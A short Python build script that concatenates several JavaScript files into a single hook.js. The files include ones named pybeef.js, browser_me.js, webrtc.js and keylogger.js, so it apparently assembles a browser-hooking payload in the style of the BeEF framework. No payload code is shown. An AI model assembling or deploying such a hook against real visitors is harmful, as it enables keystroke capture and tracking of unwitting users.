import os
fp_hook = open('hook.js','w')
fp_hook.truncate()
for file_name in ['jquery-3.1.1.js','request.js','webrtc.js','pybeef.js',
'browser_me.js','keylogger.js']:
	with open(file_name) as f:
		f_js = f.read()
	fp_hook.write(f_js)

